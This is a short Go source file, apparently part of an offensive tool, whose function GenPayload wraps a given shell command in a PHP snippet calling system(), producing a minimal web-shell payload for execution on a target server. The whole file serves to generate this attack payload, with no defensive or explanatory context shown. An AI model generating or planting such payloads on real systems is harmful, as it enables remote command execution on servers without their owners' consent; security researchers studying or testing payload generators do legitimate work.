package payload

func GenPayload(payloadtype, command string) string {
	if payloadtype == "php" {
		data := "<?php system('" + command + "'); ?>"
		return data
	}
	return ""
}
